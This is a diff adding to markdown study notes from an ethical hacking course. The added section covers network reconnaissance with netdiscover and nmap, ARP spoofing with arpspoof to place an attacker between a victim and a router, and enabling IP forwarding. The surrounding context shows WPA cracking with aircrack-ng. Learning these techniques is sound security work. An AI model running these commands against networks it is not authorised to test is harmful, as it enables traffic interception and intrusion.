@@ -216,11 +216,43 @@ Step 4: Crack with the wordlist.
 aircrack-ng filename.cap -w [wordlistfilename]
 ```
 
+## Post-connection attacks
+### Gathering information
+#### Using netdiscover
+```
+netdiscover -r 192.168.0.1/24
+```
+#### Using nmap
+Ping scan.
+```
+nmap -sn 192.168.0.1/24
+```
+Quick scan. Show open ports.
+```
+nmap -T4 -F 192.168.0.1/24
+```
+Quick scan plus. Show services and services versions, OS etc.
+```
+nmap -sV -T4 -O -F --version-light 192.168.0.1/24
+```
+Try more profiles in zenmap.
+### Man in the Middle (MITM)
+#### ARP spoofing
+##### Using arpspoof
+To fool the victim.
+```
+arpspoof -i wlan0 -t [targetIP] [routerIP]
+```
+To fool the router.
+```
+arpspoof -i wlan0 -t [routerIP] [targetIP]
+```
+Keep running both commands.
 
-
-
-
-
+Enable port forwarding.
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
 
